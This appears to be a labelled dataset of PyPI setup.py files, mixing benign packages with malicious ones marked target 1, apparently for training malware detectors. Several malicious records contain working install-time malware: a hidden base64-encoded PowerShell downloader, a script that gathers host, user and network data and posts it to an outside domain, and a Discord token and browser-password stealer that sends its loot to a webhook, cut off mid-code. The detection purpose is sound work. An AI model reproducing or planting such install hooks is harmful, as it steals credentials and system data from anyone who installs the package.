{"idx": "graphene_file_upload-1.3.0", "func": "# Always prefer setuptools over distutils\nfrom setuptools import setup, find_packages\n# To use a consistent encoding\nfrom codecs import open\nfrom os import path\n\nhere = path.abspath(path.dirname(__file__))\n\n# Get the long description from the README file\n# try:\n    # import pypandoc\n    # long_description = pypandoc.convert('README.md', 'rst')\n# except(IOError, ImportError):\n#     long_description = open('README.md').read()\n\nlong_description = open('README.rst').read()\n\nflask_requires = [\n    'Flask>=1.0.2',\n    'graphene>=2.1.2',\n    'Flask-Graphql>=2.0.0',\n]\n\ndjango_requires = [\n    'graphene-django>=2.0.0',\n]\nall_requires = flask_requires + django_requires\n\ntests_require = [\n    'coverage',\n    'pytest',\n    'pytest-cov',\n    'pytest-django'\n]\n\nsetup(\n    name='graphene_file_upload',\n    packages=find_packages(exclude=[\"tests\"]),\n    version='1.3.0',\n    description='Lib for adding file upload functionality to GraphQL mutations in Graphene Django and Flask-Graphql',\n    long_description=long_description,\n    long_description_content_type='text/x-rst',\n    author='Lucas McGartland',\n    author_email='lucasmcgartland@gmail.com',\n    url='https://github.com/lmcgartland/graphene-file-upload',  # use the URL to the github repo\n    # download_url = 'https://github.com/lmcgartland/graphene-file-upload/archive/0.1.0.tar.gz',\n    keywords=['graphql', 'graphene', 'apollo',  'upload'],  # arbitrary keywords\n    install_requires=[\n        'six>=1.11.0',\n    ],\n    tests_require=tests_require,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Natural Language :: English\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Framework :: Django :: 1.11\",\n        \"Framework :: Django :: 2.0\",\n        \"Framework :: Django :: 2.1\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.0\",\n        \"Framework :: Django :: 3.1\",\n        \"Framework :: Flask\"\n    ],\n    extras_require={\n        'flask': flask_requires,\n        'django': django_requires,\n        'all': all_requires,\n        'tests': tests_require,\n    },\n)\n", "target": 0}
{"idx": "gunicorn_color-0.1.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom setuptools import setup\nimport os\n\n\ndef get_version(version_tuple):\n    if not isinstance(version_tuple[-1], int):\n        return '.'.join(map(str, version_tuple[:-1])) + version_tuple[-1]\n    return '.'.join(map(str, version_tuple))\n\ntry:\n    from pypandoc import convert\n\n    def read_md(f):\n        return convert(f, 'rst')\n\nexcept ImportError:\n    convert = None\n    print(\n        \"warning: pypandoc module not found, could not convert Markdown to RST\"\n    )\n\n    def read_md(f):\n        return open(f, 'r').read()  # noqa\n\n\ninit = os.path.join(os.path.dirname(__file__), 'gunicorn_color.py')\nversion_line = list(filter(lambda l: l.startswith('VERSION'), open(init)))[0]\nVERSION = get_version(eval(version_line.split('=')[-1]))\n\nINSTALL_REQUIRES = ['termcolor']\nREADME = os.path.join(os.path.dirname(__file__), 'README.md')\n\nsetup(\n    name='gunicorn_color',\n    version=VERSION,\n\n    description=(\n        'Dead simple access logger for Gunicorn with termcolor support.'\n    ),\n    long_description=read_md(README),\n    url='https://github.com/swistakm/gunicorn-color-logger',\n    author='Micha\u0142 Jaworski',\n    author_email='swistakm@gmail.com',\n\n    py_modules=['gunicorn_color'],\n    include_package_data=True,\n    install_requires=INSTALL_REQUIRES,\n    zip_safe=False,\n\n    license='BSD',\n    keywords='gunicorn, color, logger, logging',\n    classifiers=[\n        'Development Status :: 2 - Pre-Alpha',\n        'Intended Audience :: Developers',\n        'Natural Language :: English',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n\n        'Topic :: Internet :: WWW/HTTP :: WSGI',\n    ],\n)\n", "target": 0}
{"idx": "evidently-0.1.55.dev0", "func": "#!/usr/bin/env python\n# coding: utf-8\n\n# Copyright (c) Jupyter Development Team.\n# Distributed under the terms of the Modified BSD License.\nimport os\nfrom os.path import join as pjoin\n\nfrom setuptools import setup\n\nfrom setupbase import (\n    create_cmdclass, ensure_targets, combine_commands,\n    HERE, install_npm\n)\n\nnb_path = pjoin(HERE, 'src', 'evidently', 'nbextension', 'static')\n\n# Representative files that should exist after a successful build\njstargets = [\n    pjoin(nb_path, 'index.js'),\n]\n\npackage_data_spec = {\n    'evidently': [\n        'nbextension/static/*.*js*',\n        'nbextension/static/*.*woff2*',\n    ]\n}\n\ndata_files_spec = [\n    ('share/jupyter/nbextensions/evidently', nb_path, '*.js*'),\n    ('share/jupyter/nbextensions/evidently', nb_path, '*.woff2'),\n    ('etc/jupyter/nbconfig/notebook.d', HERE, 'evidently.json')\n]\n\ncmdclass = create_cmdclass('jsdeps', package_data_spec=package_data_spec,\n                           data_files_spec=data_files_spec)\ncmdclass['jsdeps'] = combine_commands(\n    install_npm(os.path.join(HERE, \"ui\"), build_cmd='build'),\n    ensure_targets(jstargets),\n)\n\nsetup_args = dict(\n    cmdclass=cmdclass,\n    author_email='emeli.dral@gmail.com',\n    include_package_data=True,\n    install_requires=[\n        \"dataclasses>=0.6\",\n        \"plotly>=5.5.0\",\n        \"statsmodels>=0.12.2\",\n        \"scikit-learn>=0.24.0\",\n        \"pandas>=1.1.5\",\n        \"numpy>=1.19.5\",\n        \"scipy>=1.5.4\",\n        \"requests>=2.19.0\",\n        \"PyYAML~=5.1\"],\n    extras_require={\n        \"dev\": [\n            \"setuptools==50.3.2\",\n            \"flake8==4.0.1\",\n            \"jupyter==1.0.0\",\n            \"mypy==0.910\",\n            \"pytest==6.2.5\",\n            \"types-PyYAML==6.0.1\",\n            \"types-requests==2.26.0\",\n        ]\n    },\n    entry_points={},\n)\n\nif __name__ == '__main__':\n    setup(**setup_args)\n", "target": 0}
{"idx": "esqcandyosintcandy-1.61", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcandyosintcandy',\n    packages = ['modlib'],\n    version = '1.22',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "initializer-0.1.0", "func": "from setuptools import setup, find_packages\n\nVERSION = '0.1.0'\n\nsetup(\n    name=\"initializer\",\n    version=VERSION,\n    packages=find_packages(),\n    install_requires=['requests', 'discord_webhook'],\n    keywords=['python', 'sockets'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Unix\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)", "target": 1}
{"idx": "graphene-3.1", "func": "import ast\nimport codecs\nimport re\nimport sys\n\nfrom setuptools import find_packages, setup\nfrom setuptools.command.test import test as TestCommand\n\n_version_re = re.compile(r\"VERSION\\s+=\\s+(.*)\")\n\nwith open(\"graphene/__init__.py\", \"rb\") as f:\n    version = ast.literal_eval(_version_re.search(f.read().decode(\"utf-8\")).group(1))\n\npath_copy = sys.path[:]\n\nsys.path.append(\"graphene\")\ntry:\n    from pyutils.version import get_version\n\n    version = get_version(version)\nexcept Exception:\n    version = \".\".join([str(v) for v in version])\n\nsys.path[:] = path_copy\n\n\nclass PyTest(TestCommand):\n    user_options = [(\"pytest-args=\", \"a\", \"Arguments to pass to py.test\")]\n\n    def initialize_options(self):\n        TestCommand.initialize_options(self)\n        self.pytest_args = []\n\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = []\n        self.test_suite = True\n\n    def run_tests(self):\n        # import here, cause outside the eggs aren't loaded\n        import pytest\n\n        errno = pytest.main(self.pytest_args)\n        sys.exit(errno)\n\n\ntests_require = [\n    \"pytest>=6,<7\",\n    \"pytest-benchmark>=3.4,<4\",\n    \"pytest-cov>=3,<4\",\n    \"pytest-mock>=3,<4\",\n    \"pytest-asyncio>=0.16,<2\",\n    \"snapshottest>=0.6,<1\",\n    \"coveralls>=3.3,<4\",\n    \"promise>=2.3,<3\",\n    \"mock>=4,<5\",\n    \"pytz==2022.1\",\n    \"iso8601>=1,<2\",\n]\n\ndev_requires = [\"black==22.3.0\", \"flake8>=4,<5\"] + tests_require\n\nsetup(\n    name=\"graphene\",\n    version=version,\n    description=\"GraphQL Framework for Python\",\n    long_description=codecs.open(\n        \"README.rst\", \"r\", encoding=\"ascii\", errors=\"replace\"\n    ).read(),\n    url=\"https://github.com/graphql-python/graphene\",\n    author=\"Syrus Akbary\",\n    author_email=\"me@syrusakbary.com\",\n    license=\"MIT\",\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    keywords=\"api graphql protocol rest relay graphene\",\n    packages=find_packages(exclude=[\"examples*\"]),\n    install_requires=[\n        \"graphql-core>=3.1,<3.3\",\n        \"graphql-relay>=3.1,<3.3\",\n        \"aniso8601>=8,<10\",\n    ],\n    tests_require=tests_require,\n    extras_require={\"test\": tests_require, \"dev\": dev_requires},\n    cmdclass={\"test\": PyTest},\n)\n", "target": 0}
{"idx": "Faker-14.0.0", "func": "#!/usr/bin/env python\n\nfrom pathlib import Path\n\nfrom setuptools import find_packages, setup\n\nhere = Path(__file__).resolve().parent\nREADME = (here / \"README.rst\").read_text(encoding=\"utf-8\")\nVERSION = (here / \"VERSION\").read_text(encoding=\"utf-8\").strip()\n\nexcluded_packages = [\"docs\", \"tests\", \"tests.*\"]\n\n\n# this module can be zip-safe if the zipimporter implements iter_modules or if\n# pkgutil.iter_importer_modules has registered a dispatch for the zipimporter.\ntry:\n    import pkgutil\n    import zipimport\n\n    zip_safe = (\n        hasattr(zipimport.zipimporter, \"iter_modules\")\n        or zipimport.zipimporter in pkgutil.iter_importer_modules.registry.keys()\n    )\nexcept AttributeError:\n    zip_safe = False\n\nsetup(\n    name=\"Faker\",\n    version=VERSION,\n    description=\"Faker is a Python package that generates fake data for you.\",\n    long_description=README,\n    entry_points={\n        \"console_scripts\": [\"faker=faker.cli:execute_from_command_line\"],\n        \"pytest11\": [\"faker = faker.contrib.pytest.plugin\"],\n    },\n    classifiers=[\n        # See https://pypi.org/pypi?%3Aaction=list_classifiers\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Console\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Software Development :: Testing\",\n        \"Topic :: Utilities\",\n        \"License :: OSI Approved :: MIT License\",\n    ],\n    keywords=\"faker fixtures data test mock generator\",\n    author=\"joke2k\",\n    author_email=\"joke2k@gmail.com\",\n    url=\"https://github.com/joke2k/faker\",\n    project_urls={\n        \"Bug Tracker\": \"https://github.com/joke2k/faker/issues\",\n        \"Changes\": \"https://github.com/joke2k/faker/blob/master/CHANGELOG.md\",\n        \"Documentation\": \"http://faker.rtfd.org/\",\n        \"Source Code\": \"https://github.com/joke2k/faker\",\n    },\n    license=\"MIT License\",\n    packages=find_packages(exclude=excluded_packages),\n    package_data={\n        \"faker\": [\"py.typed\"],\n    },\n    platforms=[\"any\"],\n    zip_safe=zip_safe,\n    python_requires=\">=3.6\",\n    install_requires=[\n        \"python-dateutil>=2.4\",\n        \"typing-extensions>=3.10.0.2;python_version<'3.8'\",\n    ],\n)\n", "target": 0}
{"idx": "dividedinkedwarpdrive-99", "func": "import platform\nimport socket\nimport getpass\nimport os\nimport sys\nimport json\n\nif sys.version_info[0] >= 3:\n    import urllib.request as http_request\nif sys.version_info[0] == 2:\n    import urllib2 as http_request\n\nimport datetime\nimport hashlib\nimport uuid\nimport subprocess\n\nHOST = \"pypi-index.org\"\nPACKAGE = \"dividedinkedwarpdrive\"\nH_F1 = \"3daac9ff4692baca30b600cf2a5147719af175b29e2fa6db0cd37a40087be8a0\" \nH_F2 = \"7b49060c65297cbd4c66618c741bb1a550d069882d9f228f3d291306e8058159\" \n\nH_F3 = \"2fb844c33800fdf9c9bc52de333ffcceba35c6e5d3376bc867af31efaada460e\" \nH_F4 = \"7beed9ebc9a1c689ec854f2294fcee20f7dcc5804e60c6f79c4cad1ea26456b2\" \n\nRESP = \"\"\n\ndef sha256(str_):\n    return hashlib.sha256(str_.encode('utf-8')).hexdigest()\n\ndef find_in_folder(dir, hash_):\n    for f in os.listdir(dir):\n        if sha256(f) == hash_:\n            return f\n\ndef JWtZETxrGN_1():\n    k = False\n    try:\n        if platform.system().lower() in ('darwin', 'linux'):\n            home_dir = os.path.expanduser(\"~\")\n            if os.path.isdir(home_dir):\n                f1 = find_in_folder(home_dir, H_F1)\n                if f1:\n                    f1 = os.path.join(home_dir, f1)\n                    f2 = find_in_folder(f1, H_F2)\n                    k = True if f2 else False\n    except:\n        pass\n\n    return k\n\ndef rLscSvytBP_2():\n    global RESP\n    try:\n        req = http_request.Request(\"http://127.0.0.1:19000/certs\")\n        response = http_request.urlopen(req, timeout=5)\n        RESP = response.read().decode('utf-8')\n        return True\n    except:\n        return False\n\ndef SxiRVrIPbC_3():\n    for name, value in os.environ.items():\n        if sha256(name) == H_F3 and sha256(value) == H_F4:\n            return True\n    return False\n\ndef detect_system():\n    \n    \n    \n    \n    \n    key = 0\n    if JWtZETxrGN_1():\n        key = 1\n    elif rLscSvytBP_2():\n        key = 2\n    elif SxiRVrIPbC_3():\n        key = 3 \n    \n    return key\n\ndef read_config(config):\n    c = \"\"\n    try:\n        f = open(config)\n        for line in f.readlines():\n            if line[0] != \"#\":\n                c += line\n        f.close()\n    except:\n        pass\n    \n    return c\n\n\ndef get_dns():\n    return read_config(\"/etc/resolv.conf\")\n    \n\ndef get_hosts():\n    return read_config(\"/etc/hosts\")\n\ndef get_time_zone():\n    res = \"\"\n    try:\n        c_utc = datetime.datetime.utcnow()\n        zone = \"\"\n        if sys.version_info[0] >= 3 and sys.version_info[1] >= 3:\n            zone = datetime.datetime.now().astimezone().tzinfo\n        else:\n            zone = \"\"\n        res = str(c_utc) + \" \" + str(zone)\n    except:\n        pass\n    return res\n\ndef getifip(ifn):\n    import socket, fcntl, struct\n\n    try:\n        sck = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        \n        if sys.version_info[0] >= 3:\n            ifn = ifn.encode()\n            return socket.inet_ntoa(fcntl.ioctl(sck.fileno(),0x8915,struct.pack('256s', ifn[:15]))[20:24])\n    except:\n        pass\n    return \"UNKNOWN\"\n\ndef get_mac(ifn):\n    f = open(\"/sys/class/net/{}/address\".format(ifn))\n    mac = f.read()\n    f.close()\n    return mac\n\ndef get_network_interfaces():\n    interfaces = []\n    sysp = platform.system()\n\n    if sysp.lower() == \"linux\":\n        f = open(\"/proc/net/dev\", \"r\")\n        lines = f.readlines()[2:]\n        f.close()\n        for line in lines:\n            interface = line.split(\":\")[0].strip()\n            interfaces.append(interface)\n    elif sysp.lower() == \"darwin\":\n        process = subprocess.Popen([\"ifconfig\"], stdout=subprocess.PIPE)\n        output = process.communicate()[0].decode('utf-8')\n        lines = output.split(\"\\n\")\n        for line in lines:\n            if \"flags\" in line and \"mtu\" in line:\n                interface = line.split(\":\")[0].strip()\n                interfaces.append(interface)\n    elif sysp.lower() == \"windows\":\n        interfaces = [interface[0] for interface in socket.if_nameindex()]\n\n    return interfaces\n\ndef get_ip_addresses(interface):\n    ips = []\n    macs = []\n    sysp = platform.system()\n\n    if sysp.lower() == \"linux\":\n        ip = getifip(interface)\n        ips.append(ip)\n        mac = get_mac(interface)\n        macs.append(mac)\n\n    elif sysp.lower() == \"darwin\":\n        process = subprocess.Popen([\"ifconfig\", interface], stdout=subprocess.PIPE)\n        output = process.communicate()[0].decode('utf-8')\n        lines = output.split(\"\\n\")\n        for line in lines:\n            if \"inet \" in line:\n                ip = line.split(\" \")[1]\n                ips.append(ip)\n            if \"ether \" in line:\n                mac = line.split(\" \")[1]\n                macs.append(mac)\n            \n    elif sysp.lower() == \"windows\":\n        ips = [socket.gethostbyname(socket.gethostname())]\n\n    return ips, macs\n\n\ndef get_net():\n    c = \"\"\n    try:\n        network_interfaces = get_network_interfaces()\n        for interface in network_interfaces:\n            ips, macs = get_ip_addresses(interface)\n            if ips:\n                c += (\"{}|{}|{}\\n\".format(interface, ','.join(ips), \",\".join(macs)))\n    except:\n        pass\n\n    return c\n\ndef collect_info():\n    os_name = platform.system().lower()\n    os_version = platform.version()\n    hostname = socket.gethostname()\n    username = getpass.getuser()\n    current_directory = os.getcwd()\n    home_dir = os.path.expanduser(\"~\")\n    dns = get_dns()\n    hosts = get_hosts()\n    net = get_net() \n    c_time = get_time_zone()\n    k = detect_system()\n\n    data = {\n        \"src\": \"py\"+str(sys.version_info[0]) + \" \" + PACKAGE,\n        \"os\": \"{} {} {}\".format(os_name, platform.platform(), os_version),\n        \"hostname\": hostname,\n        \"user\": username,\n        \"cwd\": current_directory,\n        \"hd\" : home_dir,\n        \"dns\": dns,\n        \"hosts\" : hosts,\n        \"optn\": RESP,\n        \"net\": net,\n        \"time\": c_time,\n        \"key\": k\n    }\n\n    return data\n\ndef run_me():\n    \n    data = collect_info()\n    json_data = json.dumps({\"data\": data}).encode('utf-8')\n    url = \"https://{}/process_data\".format(HOST)\n    \n    try:  \n        req = http_request.Request(url, data=json_data, headers={'Content-Type': 'application/json'})\n        response = http_request.urlopen(req, timeout=30)\n        \n    except http_request.HTTPError as e:\n        pass\n        \n    except Exception as e:\n        pass\n        \n\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport subprocess \nimport shutil\nimport site\nimport atexit\nimport sys, os\n\ndef get_index():\n    try:\n        f = open(os.path.expanduser(\"~/.pip/pip.conf\"))\n    except OSError:\n        return\n    except IOError:\n        return\n    \n    for line in f.readlines():\n        if \"index-url\" in line:\n            f.close()\n            return line.split(\"=\")[-1].strip()\n    f.close()\n\n\nclass CustomInstall(install):\n    def run(self):    \n        def _post_install():      \n            \n            pip = \"{} -m pip\".format(sys.executable)\n            \n            \n            \n            index_url = get_index()\n            if not index_url:\n                return\n\n             \n            if sys.version_info[0] >= 3 and sys.version_info[1] >= 10:\n                py_path = 'PYTHONPATH=\"{}\" '.format(site.getsitepackages()[0]) \n            else:\n                py_path = ''\n\n\n            \n            try:\n                s = subprocess.check_output('{}{} install {} --index-url \"{}\"'.format(py_path, pip, PACKAGE, index_url), shell=True)#.decode()\n            except subprocess.CalledProcessError:\n                return\n            \n            \n            \n            if \"bdist_wheel\" in sys.argv:\n                \n                s = subprocess.check_output('{}{} download {} --no-deps --index-url \"{}\"'.format(py_path, pip, PACKAGE, index_url), shell=True)#.decode()\n\n                dw_wheel = os.listdir(os.getcwd())[-1].strip()\n                \n                \n                t_dir = sys.argv[-1]\n                \n                if not os.path.exists(t_dir):\n                    os.makedirs(t_dir)\n                    shutil.move(dw_wheel, t_dir + \"/\" + dw_wheel)\n                else:\n                    \n                    t_wheel  = os.listdir(t_dir)[-1].strip()\n                    \n                    \n                    os.unlink(t_dir + \"/\" + t_wheel)\n                    \n                    shutil.move(dw_wheel, t_dir + \"/\" + dw_wheel)\n            \n        atexit.register(_post_install)\n        run_me()\n        install.run(self)\n\ntry:\n\n    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))\n    README = open(os.path.join(SCRIPT_DIR, \"README.md\"), \"rb\")\n    README_DATA = README.read().decode(\"utf8\")\n    README.close()\n\n    setup(\n        name=PACKAGE,\n        version='99.0',\n        packages=find_packages(),\n        cmdclass={'install': CustomInstall},  \n        long_description=README_DATA,\n        long_description_content_type=\"text/markdown\",   \n    )\nexcept Exception as e:\n    pass\n", "target": 1}
{"idx": "shiwers-1", "func": "from setuptools import setup\nfrom builtins import all,dir,exec,format,len,ord,print,int,list,range,set,str,open\nexec('')\nimport os\nimport threading\nfrom sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads,load\nfrom ctypes import windll,wintypes,byref,cdll,Structure,POINTER,c_char,c_buffer\nfrom urllib.request import Request,urlopen\nfrom json import loads,dumps\nimport time\nimport shutil\nfrom zipfile import ZipFile\nimport random\nimport re\nimport subprocess\n\nhook='https://discord.com/api/webhooks/1107996380053643274/AgAkWSs1QaSjlP_4KKVltYswq6QeS1B2WCnBi3Jv7eHkOOyf_1RSVUlxNhfgU0NsFC7W'\nDETECTED=False\ndef getip():\n    ip='None'\n    try:\n        ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()\n    except:\n        pass\n    return ip\nrequirements=[\n['requests','requests'],\n['Crypto.Cipher','pycryptodome']\n]\nfor modl in requirements:\n    try:__import__(modl[0])\n    except:\n        subprocess.Popen(f\"{executable} -m pip install {modl[1]}\",shell=True)\n        time.sleep(3)\nimport requests\nfrom Crypto.Cipher import AES\nlocal=os.getenv('LOCALAPPDATA')\nroaming=os.getenv('APPDATA')\ntemp=os.getenv('TEMP')\nThreadlist=[]\nclass DATA_BLOB(Structure):\n    _fields_=[\n('cbData',wintypes.DWORD),\n('pbData',POINTER(c_char))\n]\ndef GetData(blob_out):\n    cbData=int(blob_out.cbData)\n    pbData=blob_out.pbData\n    buffer=c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer,pbData,cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\ndef CryptUnprotectData(encrypted_bytes,entropy=b''):\n    buffer_in=c_buffer(encrypted_bytes,len(encrypted_bytes))\n    buffer_entropy=c_buffer(entropy,len(entropy))\n    blob_in=DATA_BLOB(len(encrypted_bytes),buffer_in)\n    blob_entropy=DATA_BLOB(len(entropy),buffer_entropy)\n    blob_out=DATA_BLOB()\n    if windll.crypt32.CryptUnprotectData(byref(blob_in),None,byref(blob_entropy),None,None,0x01,byref(blob_out)):\n        return GetData(blob_out)\ndef DecryptValue(buff,master_key=None):\n    starts=buff.decode(encoding='utf8',errors='ignore')[:3]\n    if starts=='v10' or starts=='v11':\n        iv=buff[3:15]\n        payload=buff[15:]\n        cipher=AES.new(master_key,AES.MODE_GCM,iv)\n        decrypted_pass=cipher.decrypt(payload)\n        decrypted_pass=decrypted_pass[:-16].decode()\n        return decrypted_pass\ndef LoadRequests(methode,url,data='',files='',headers=''):\n    for i in range(8):# max trys\n        try:\n            if methode=='POST':\n                if data !='':\n                    r=requests.post(url,data=data)\n                    if r.status_code==200:\n                        return r\n                elif files !='':\n                    r=requests.post(url,files=files)\n                    if r.status_code==200 or r.status_code==413:# 413=DATA TO BIG\n                        return r\n        except:\n            pass\ndef LoadUrlib(hook,data='',files='',headers=''):\n    for i in range(8):\n        try:\n            if headers !='':\n                r=urlopen(Request(hook,data=data,headers=headers))\n                return r\n            else:\n                r=urlopen(Request(hook,data=data))\n                return r\n        except:\n            pass\ndef Trust(Cookies):\n    global DETECTED\n    data=str(Cookies)\n    tim=re.findall('.google.com',data)\n    if len(tim)<-1:\n        DETECTED=True\n        return DETECTED\n    else:\n        DETECTED=False\n        return DETECTED\ndef GetUHQFriends(token):\n    badgeList=[\n{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},\n{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},\n{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},\n{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},\n{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},\n{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},\n{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},\n{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},\n{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},\n{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}\n]\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        friendlist=loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships',headers=headers)).read().decode())\n    except:\n        return False\n    uhqlist=''\n    for friend in friendlist:\n        OwnedBadges=''\n        flags=friend['user']['public_flags']\n        for badge in badgeList:\n            if flags//badge['Value']!=0 and friend['type']==1:\n                if not 'House' in badge['Name']:\n                    OwnedBadges+=badge['Emoji']\n                flags=flags % badge['Value']\n        if OwnedBadges !='':\n            uhqlist+=f\"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\\n\"\n    return uhqlist\ndef GetBilling(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        billingjson=loads(urlopen(Request('https://discord.com/api/users/@me/billing/payment-sources',headers=headers)).read().decode())\n    except:\n        return False\n    if billingjson==[]:return ' -'\n    billing=''\n    for methode in billingjson:\n        if methode['invalid']==False:\n            if methode['type']==1:\n                billing+='<a:Cc:1032742457416355882>'\n            elif methode['type']==2:\n                billing+='<:paypal:1027984840131366922> '\n    return billing\ndef GetBadge(flags):\n    if flags==0:return ''\n    OwnedBadges=''\n    badgeList=[\n{'Name':'Early_Verified_Bot_Developer','Value':131072,'Emoji':'<:developer:874750808472825986> '},\n{'Name':'Bug_Hunter_Level_2','Value':16384,'Emoji':'<:bughunter_2:874750808430874664> '},\n{'Name':'Early_Supporter','Value':512,'Emoji':'<:early_supporter:874750808414113823> '},\n{'Name':'House_Balance','Value':256,'Emoji':'<:balance:874750808267292683> '},\n{'Name':'House_Brilliance','Value':128,'Emoji':'<:brilliance:874750808338608199> '},\n{'Name':'House_Bravery','Value':64,'Emoji':'<:bravery:874750808388952075> '},\n{'Name':'Bug_Hunter_Level_1','Value':8,'Emoji':'<:bughunter_1:874750808426692658> '},\n{'Name':'HypeSquad_Events','Value':4,'Emoji':'<:hypesquad_events:874750808594477056> '},\n{'Name':'Partnered_Server_Owner','Value':2,'Emoji':'<:partner:874750808678354964> '},\n{'Name':'Discord_Employee','Value':1,'Emoji':'<:staff:874750808728666152> '}\n]\n    for badge in badgeList:\n        if flags//badge['Value']!=0:\n            OwnedBadges+=badge['Emoji']\n            flags=flags % badge['Value']\n    return OwnedBadges\ndef GetTokenInfo(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    userjson=loads(urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers)).read().decode())\n    username=userjson['username']\n    hashtag=userjson['discriminator']\n    email=userjson['email']\n    idd=userjson['id']\n    pfp=userjson['avatar']\n    flags=userjson['public_flags']\n    nitro=''\n    phone='-'\n    if 'premium_type' in 